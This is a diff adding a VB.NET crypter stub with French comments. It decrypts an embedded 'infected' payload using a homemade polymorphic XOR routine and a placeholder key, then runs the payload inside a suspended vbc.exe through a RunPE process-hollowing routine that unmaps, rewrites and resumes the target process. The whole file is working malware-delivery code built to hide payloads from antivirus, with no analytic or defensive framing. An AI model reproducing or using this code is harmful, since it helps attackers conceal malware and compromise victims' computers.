@@ -1,0 +1,485 @@
+Imports System, Microsoft.VisualBasic
+Imports System.Runtime.InteropServices
+Imports System.Text
+Imports System.Reflection
+Imports System.Security.Cryptography
+Imports System.Runtime.CompilerServices
+Imports System.IO
+Imports System.IO.FileStream
+Imports System.ComponentModel
+Imports Microsoft.Win32
+Imports System.Diagnostics
+Imports System.Object
+Imports System.Net
+Imports System.Windows.Forms
+Imports System.Threading.Thread
+Imports System.Environment
+Imports System.Threading
+Imports System.IO.Compression
+Imports System.Resources.ResourceManager
+
+Module MainStub
+'Algorithm de Cryptage Polymorphic
+    Public Class PolyMorphicStairs
+        Overloads Shared Function PolyCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
+            Array.Resize(Data, Data.Length + 1)
+            Data(Data.Length - 1) = Convert.ToByte(New Random().Next(1, 255))
+            For i As Integer = (Data.Length - 1) * (ExtraRounds + 1) To 0 Step -1
+                Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor Key(i Mod Key.Length)
+            Next
+            Return Data
+        End Function
+        Overloads Shared Function PolyDeCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal ExtraRounds As UInteger = 0) As Byte()
+            For i As Integer = 0 To (Data.Length - 1) * (ExtraRounds + 1)
+                Data(i Mod Data.Length) = CByte((CInt(Data(i Mod Data.Length) Xor Key(i Mod Key.Length)) - CInt(Data((i + 1) Mod Data.Length)) + 256) Mod 256)
+            Next
+            Array.Resize(Data, Data.Length - 1)
+            Return Data
+        End Function
+    End Class
+
+    Sub Main()
+
+        'Decryption du Byte Infecter
+
+        Dim decryptbytes As Byte() = PolyMorphicStairs.PolyDeCrypt(Convert.FromBase64String(ByteInfecté), Encoding.GetEncoding(1250).GetBytes("LaCléRemplacerIci"))
+
+        'Declaration de L'injection.
+
+        DD.SRexec(decryptbytes, "C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe")
+
+    End Sub
+
+End Module
+
+'Le RunPE sert à Injecter un Byte dans la Memoire.
+
+Class DD
+
+    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
+    Structure STARTUPINFO
+        Public cb As Integer
+        Public lpReserved As String
+        Public lpDesktop As String
+        Public lpTitle As String
+        Public dwX As Integer
+        Public dwY As Integer
+        Public dwXSize As Integer
+        Public dwYSize As Integer
+        Public dwXCountChars As Integer
+        Public dwYCountChars As Integer
+        Public dwFillAttribute As Integer
+        Public dwFlags As Integer
+        Public wShowWindow As Short
+        Public cbReserved2 As Short
+        Public lpReserved2 As Integer
+        Public hStdInput As Integer
+        Public hStdOutput As Integer
+        Public hStdError As Integer
+    End Structure
+    Private Structure PROCESS_INFORMATION
+        Public hProcess As IntPtr
+        Public hThread As IntPtr
+        Public dwProcessId As Integer
+        Public dwThreadId As Integer
+    End Structure
+    <StructLayout(LayoutKind.Sequential)> _
+    Private Structure IMAGE_DOS_HEADER
+        Public e_magic As UInt16
+        ' Magic number
+        Public e_cblp As UInt16
+        ' Bytes on last page of file
+        Public e_cp As UInt16
+        ' Pages in file
+        Public e_crlc As UInt16
+        ' Relocations
+        Public e_cparhdr As UInt16
+        ' Size of header in paragraphs
+        Public e_minalloc As UInt16
+        ' Minimum extra paragraphs needed
+        Public e_maxalloc As UInt16
+        ' Maximum extra paragraphs needed
+        Public e_ss As UInt16
+        ' Initial (relative) SS value
+        Public e_sp As UInt16
+        ' Initial SP value
+        Public e_csum As UInt16
+        ' Checksum
+        Public e_ip As UInt16
+        ' Initial IP value
+        Public e_cs As UInt16
+        ' Initial (relative) CS value
+        Public e_lfarlc As UInt16
+        ' File address of relocation table
+        Public e_ovno As UInt16
+        ' Overlay number
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=4)> _
+        Public e_res1 As UInt16()
+        ' Reserved words
+        Public e_oemid As UInt16
+        ' OEM identifier (for e_oeminfo)
+        Public e_oeminfo As UInt16
+        ' OEM information; e_oemid specific
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=10)> _
+        Public e_res2 As UInt16()
+        ' Reserved words
+        Public e_lfanew As Int32
+        ' File address of new EXE header
+    End Structure
+    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
+    Private Structure VS_VERSIONINFO
+        Public wLength As UInt16
+        Public wValueLength As UInt16
+        Public wType As UInt16
+        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=15)> _
+        Public szKey As String
+        Public Padding1 As UInt16
+    End Structure
+    <StructLayout(LayoutKind.Sequential)> _
+    Structure SECURITY_ATTRIBUTES
+        Public nLength As Integer
+        Public lpSecurityDescriptor As IntPtr
+        Public bInheritHandle As Integer
+    End Structure
+    <StructLayout(LayoutKind.Sequential)> _
+    Private Structure VS_FIXEDFILEINFO
+        Public dwSignature As UInt32
+        Public dwStrucVersion As UInt32
+        Public dwFileVersionMS As UInt32
+        Public dwFileVersionLS As UInt32
+        Public dwProductVersionMS As UInt32
+        Public dwProductVersionLS As UInt32
+        Public dwFileFlagsMask As UInt32
+        Public dwFileFlags As UInt32
+        Public dwFileOS As UInt32
+        Public dwFileType As UInt32
+        Public dwFileSubtype As UInt32
+        Public dwFileDateMS As UInt32
+        Public dwFileDateLS As UInt32
+    End Structure
+    <StructLayout(LayoutKind.Sequential)> _
+    Public Structure FLOATING_SAVE_AREA
+
+
+        Public ControlWord As UInteger
+        Public StatusWord As UInteger
+        Public TagWord As UInteger
+        Public ErrorOffset As UInteger
+        Public ErrorSelector As UInteger
+        Public DataOffset As UInteger
+        Public DataSelector As UInteger
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=80)> _
+        Public RegisterArea As Byte()
+        Public Cr0NpxState As UInteger
+
+    End Structure
+    <StructLayout(LayoutKind.Sequential)> _
+    Public Structure CONTEXT
+
+
+        Public ContextFlags As UInteger
+        'set this to an appropriate value
+        ' Retrieved by CONTEXT_DEBUG_REGISTERS
+        Public Dr0 As UInteger
+        Public Dr1 As UInteger
+        Public Dr2 As UInteger
+        Public Dr3 As UInteger
+        Public Dr6 As UInteger
+        Public Dr7 As UInteger
+        ' Retrieved by CONTEXT_FLOATING_POINT
+        Public FloatSave As FLOATING_SAVE_AREA
+        ' Retrieved by CONTEXT_SEGMENTS
+        Public SegGs As UInteger
+        Public SegFs As UInteger
+        Public SegEs As UInteger
+        Public SegDs As UInteger
+        ' Retrieved by CONTEXT_INTEGER
+        Public Edi As UInteger
+        Public Esi As UInteger
+        Public Ebx As UInteger
+        Public Edx As UInteger
+        Public Ecx As UInteger
+        Public Eax As UInteger
+        ' Retrieved by CONTEXT_CONTROL
+        Public Ebp As UInteger
+        Public Eip As UInteger
+        Public SegCs As UInteger
+        Public EFlags As UInteger
+        Public Esp As UInteger
+        Public SegSs As UInteger
+        ' Retrieved by CONTEXT_EXTENDED_REGISTERS
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=512)> _
+        Public ExtendedRegisters As Byte()
+
+    End Structure
+    <StructLayout(LayoutKind.Sequential)> _
+    Public Structure IMAGE_OPTIONAL_HEADER32
+        '
+        ' Standard fields.
+        '
+        Public Magic As UInt16
+        Public MajorLinkerVersion As [Byte]
+        Public MinorLinkerVersion As [Byte]
+        Public SizeOfCode As UInt32
+        Public SizeOfInitializedData As UInt32
+        Public SizeOfUninitializedData As UInt32
+        Public AddressOfEntryPoint As UInt32
+        Public BaseOfCode As UInt32
+        Public BaseOfData As UInt32
+        '
+        ' NT additional fields.
+        '
+        Public ImageBase As UInt32
+        Public SectionAlignment As UInt32
+        Public FileAlignment As UInt32
+        Public MajorOperatingSystemVersion As UInt16
+        Public MinorOperatingSystemVersion As UInt16
+        Public MajorImageVersion As UInt16
+        Public MinorImageVersion As UInt16
+        Public MajorSubsystemVersion As UInt16
+        Public MinorSubsystemVersion As UInt16
+        Public Win32VersionValue As UInt32
+        Public SizeOfImage As UInt32
+        Public SizeOfHeaders As UInt32
+        Public CheckSum As UInt32
+        Public Subsystem As UInt16
+        Public DllCharacteristics As UInt16
+        Public SizeOfStackReserve As UInt32
+        Public SizeOfStackCommit As UInt32
+        Public SizeOfHeapReserve As UInt32
+        Public SizeOfHeapCommit As UInt32
+        Public LoaderFlags As UInt32
+        Public NumberOfRvaAndSizes As UInt32
+        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=16)> _
+        Public DataDirectory As IMAGE_DATA_DIRECTORY()
+    End Structure
+    <StructLayout(LayoutKind.Sequential)> _
+    Public Structure IMAGE_FILE_HEADER
+        Public Machine As UInt16
+        Public NumberOfSections As UInt16
+        Public TimeDateStamp As UInt32
+        Public PointerToSymbolTable As UInt32
+        Public NumberOfSymbols As UInt32
+        Public SizeOfOptionalHeader As UInt16
+        Public Characteristics As UInt16
+    End Structure
+    <StructLayout(LayoutKind.Sequential)> _
+    Public Structure IMAGE_DATA_DIRECTORY
+        Public VirtualAddress As UInt32
+        Public Size As UInt32
+    End Structure
+    Public Structure IMAGE_NT_HEADERS
+        Public Signature As UInt32
+        Public FileHeader As IMAGE_FILE_HEADER
+        Public OptionalHeader As IMAGE_OPTIONAL_HEADER32
+    End Structure
+    Public Enum IMAGE_SIZEOF_SHORT_NAME
+        IMAGE_SIZEOF_SHORT_NAME = 8
+    End Enum
+    Public Structure Misc
+        Public PhysicalAddress As System.UInt32
+        Public VirtualSize As System.UInt32
+    End Structure
+    Public Structure IMAGE_SECTION_HEADER
+        Public Name As System.Byte
+        Public Misc As Misc
+        Public VirtualAddress As System.UInt32
+        Public SizeOfRawData As System.UInt32
+        Public PointerToRawData As System.UInt32
+        Public PointerToRelocations As System.UInt32
+        Public PointerToLinenumbers As System.UInt32
+        Public NumberOfRelocations As System.UInt16
+        Public NumberOfLinenumbers As System.UInt16
+        Public Characteristics As System.UInt32
+    End Structure
+
+    Public Const CONTEXT_X86 = &H10000
+    Public Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)          'SS:SP, CS:IP, FLAGS, BP
+    Public Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)          'AX, BX, CX, DX, SI, DI
+    Public Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)         'DS, ES, FS, GS
+    Public Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)   '387 state
+    Public Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10) 'DB 0-3,6,7
+    Public Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)
+    Public Const CREATE_SUSPENDED = &H4
+    Public Const MEM_COMMIT As Long = &H1000&
+    Public Const MEM_RESERVE As Long = &H2000&
+    Public Const PAGE_NOCACHE As Long = &H200
+    Public Const PAGE_EXECUTE_READWRITE As Long = &H40
+    Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80
+    Public Const PAGE_EXECUTE_READ As Long = &H20
+    Public Const PAGE_EXECUTE As Long = &H10
+    Public Const PAGE_WRITECOPY As Long = &H8
+    Public Const PAGE_NOACCESS As Long = &H1
+    Public Const PAGE_READWRITE As Long = &H4
+
+    <DllImport("kernel32.dll")> _
+    Private Shared Function ResumeThread(ByVal hThread As IntPtr) As UInt32
+    End Function
+    <DllImport("kernel32.dll")> _
+    Private Shared Function GetThreadContext(ByVal hThread As IntPtr, ByRef lpContext As CONTEXT) As Boolean
+    End Function
+    <DllImport("kernel32.dll")> _
+    Private Shared Function SetThreadContext(ByVal hThread As IntPtr, ByRef lpContext As CONTEXT) As Boolean
+    End Function
+
+    <DllImport("kernel32.dll")> _
+    Private Shared Function LoadLibraryA(ByVal lpLibFileName As String) As Integer
+    End Function
+    <DllImport("kernel32.dll")> _
+    Private Shared Function CreateProcess(ByVal lpApplicationName As String, _
+    ByVal lpCommandLine As String, ByRef lpProcessAttributes As SECURITY_ATTRIBUTES, _
+     ByRef lpThreadAttributes As SECURITY_ATTRIBUTES, ByVal bInheritHandles As Boolean, _
+    ByVal dwCreationFlags As UInt32, ByVal lpEnvironment As IntPtr, ByVal lpCurrentDirectory As String, _
+   <[In]()> ByRef lpStartupInfo As STARTUPINFO, _
+   <[Out]()> ByRef lpProcessInformation As PROCESS_INFORMATION) As Boolean
+    End Function
+
+    <DllImport("kernel32.dll", _
+    SetLastError:=True, _
+    CharSet:=CharSet.Auto, _
+    EntryPoint:="WriteProcessMemory", _
+    CallingConvention:=CallingConvention.StdCall)> _
+    Shared Function WriteProcessMemory( _
+ ByVal hProcess As IntPtr, _
+ ByVal lpBaseAddress As IntPtr, _
+ ByVal lpBuffer As Byte(), _
+ ByVal iSize As Int32, _
+ <Out()> ByRef lpNumberOfBytesWritten As Int32) As Boolean
+    End Function
+    <DllImport("kernel32.dll", _
+SetLastError:=True, _
+CharSet:=CharSet.Auto, _
+EntryPoint:="WriteProcessMemory", _
+CallingConvention:=CallingConvention.StdCall)> _
+    Shared Function WriteProcessMemoryI( _
+ByVal hProcess As IntPtr, _
+ByVal lpBaseAddress As IntPtr, _
+ByVal lpBuffer As IntPtr, _
+ByVal iSize As Int32, _
+<Out()> ByRef lpNumberOfBytesWritten As Int32) As Boolean
+    End Function
+    <DllImport("kernel32.dll", EntryPoint:="ReadProcessMemory")> _
+    Public Shared Function ReadProcessMemory(ByVal hProcess As IntPtr, _
+    ByVal lpBaseAddress As Integer, _
+    ByRef lpbuffer As IntPtr, _
+    ByVal size As Integer, _
+    ByRef lpNumberOfBytesRead As Integer) As Int32
+    End Function
+    <DllImport("ntdll.dll")> _
+    Public Shared Function ZwUnmapViewOfSection(ByVal hProcess As IntPtr, ByVal BaseAddress As IntPtr) As Long
+    End Function
+
+    <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)> _
+    Public Shared Function VirtualAllocEx(ByVal hProcess As IntPtr, ByVal lpAddress As IntPtr, _
+    ByVal dwSize As UInteger, ByVal flAllocationType As UInteger, _
+    ByVal flProtect As UInteger) As IntPtr
+    End Function
+    <DllImport("kernel32", CharSet:=CharSet.Auto, SetLastError:=True)> _
+    Public Shared Function VirtualProtectEx(ByVal hProcess As IntPtr, ByVal lpAddress As IntPtr, ByVal dwSize As UIntPtr, ByVal flNewProtect As UIntPtr, <Out()> ByVal lpflOldProtect As UInteger) As Integer
+    End Function
+
+    Const GENERIC_READ As Int32 = &H80000000
+    Const FILE_SHARE_READ As UInt32 = &H1
+    Const OPEN_EXISTING As UInt32 = 3
+    Const FILE_ATTRIBUTE_NORMAL As UInt32 = &H80
+    Const INVALID_HANDLE_VALUE As Int32 = -1
+    Const PAGE_READONLY As UInt32 = &H2
+    Const FILE_MAP_READ As UInt32 = &H4
+    Const IMAGE_DOS_SIGNATURE As UInt16 = &H5A4D
+    Const RT_VERSION As Int32 = 16
+
+    Private Enum ImageSignatureTypes
+        IMAGE_DOS_SIGNATURE = &H5A4D     ''\\ MZ
+        IMAGE_OS2_SIGNATURE = &H454E     ''\\ NE
+        IMAGE_OS2_SIGNATURE_LE = &H454C  ''\\ LE
+        IMAGE_VXD_SIGNATURE = &H454C     ''\\ LE
+        IMAGE_NT_SIGNATURE = &H4550      ''\\ PE00
+    End Enum
+
+    Public Shared Sub SRexec(ByVal b() As Byte, ByVal sVictim As String)
+        Dim sVersion As [String] = Nothing
+        Dim pidh As IMAGE_DOS_HEADER
+        Dim context As CONTEXT = New CONTEXT()
+
+        Dim Pinh As IMAGE_NT_HEADERS
+        Dim Pish As IMAGE_SECTION_HEADER
+
+        Dim pi As PROCESS_INFORMATION = New PROCESS_INFORMATION()
+        Dim si As STARTUPINFO = New STARTUPINFO()
+
+        Dim pSec As SECURITY_ATTRIBUTES = New SECURITY_ATTRIBUTES()
+        Dim tSec As SECURITY_ATTRIBUTES = New SECURITY_ATTRIBUTES()
+
+        'converts a data type in another type.
+        'since .net types are different from types handle by winAPI,  DirectCall a API will cause a type mismatch, since .net types
+        ' structure is completely different, using different resources.
+        Dim MyGC As GCHandle = GCHandle.Alloc(b, GCHandleType.Pinned)
+        Dim ptbuffer As Integer = MyGC.AddrOfPinnedObject.ToInt32
+        pidh = Marshal.PtrToStructure(MyGC.AddrOfPinnedObject, pidh.GetType)
+        MyGC.Free()
+
+        If CreateProcess(Nothing, sVictim, pSec, tSec, False, &H4, Nothing, Nothing, si, pi) = 0 Then
+            Exit Sub
+        End If
+
+        Dim vt As Integer = ptbuffer + pidh.e_lfanew
+        Pinh = Marshal.PtrToStructure(New IntPtr(vt), Pinh.GetType)
+
+        Dim addr As Long, lOffset As Long, ret As UInteger
+        si.cb = Len(si)
+        context.ContextFlags = CONTEXT86_INTEGER
+
+        'all "IF" are only for better understanding, you could do all verification on the builder and then the rest on the stub
+        If Pinh.Signature <> ImageSignatureTypes.IMAGE_NT_SIGNATURE Or pidh.e_magic <> ImageSignatureTypes.IMAGE_DOS_SIGNATURE Then Exit Sub
+        If GetThreadContext(pi.hThread, context) And _
+            ReadProcessMemory(pi.hProcess, context.Ebx + 8, addr, 4, 0) >= 0 And _
+            ZwUnmapViewOfSection(pi.hProcess, addr) >= 0 Then
+
+            Dim ImageBase As UInt32 = VirtualAllocEx(pi.hProcess, Pinh.OptionalHeader.ImageBase, Pinh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
+            If ImageBase <> 0 Then
+                WriteProcessMemory(pi.hProcess, ImageBase, b, Pinh.OptionalHeader.SizeOfHeaders, ret)
+
+                lOffset = pidh.e_lfanew + 248
+                For i As Integer = 0 To Pinh.FileHeader.NumberOfSections - 1
+                    'math changes, anyone with pe understanding know
+                    Pish = Marshal.PtrToStructure(New IntPtr(ptbuffer + lOffset + i * 40), Pish.GetType)
+                    Dim braw(Pish.SizeOfRawData) As Byte
+                    'more math for reading only the section.  mm API has a "shortcut" when you pass a specified startpoint.
+                    '.net can't use so you have to make a new array
+                    For j As Integer = 0 To Pish.SizeOfRawData - 1
+                        braw(j) = b(Pish.PointerToRawData + j)
+                    Next
+                    WriteProcessMemory(pi.hProcess, ImageBase + Pish.VirtualAddress, braw, Pish.SizeOfRawData, ret)
+                    VirtualProtectEx(pi.hProcess, ImageBase + Pish.VirtualAddress, Pish.Misc.VirtualSize, Protect(Pish.Characteristics), addr)
+                Next i
+                Dim bb As Byte() = BitConverter.GetBytes(ImageBase)
+
+                WriteProcessMemory(pi.hProcess, context.Ebx + 8, bb, 4, ret)
+                context.Eax = ImageBase + Pinh.OptionalHeader.AddressOfEntryPoint
+                Call SetThreadContext(pi.hThread, context)
+                Call ResumeThread(pi.hThread)
+            End If
+        End If
+    End Sub
+
+    Private Shared Function Protect(ByVal characteristics As Long) As Long
+        Dim mapping() As Object = {PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, _
+                        PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, _
+                        PAGE_READWRITE, PAGE_EXECUTE_READWRITE}
+
+        Protect = mapping(RShift(characteristics, 29))
+    End Function
+
+    Private Shared Function RShift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
+        RShift = vbLongToULong(lValue) / (2 ^ lNumberOfBitsToShift)
+    End Function
+    Private Shared Function vbLongToULong(ByVal Value As Long) As Double
+        Const OFFSET_4 = 4294967296.0#
+        If Value < 0 Then
+            vbLongToULong = Value + OFFSET_4
+        Else
+            vbLongToULong = Value
+        End If
+    End Function
+
+End Class
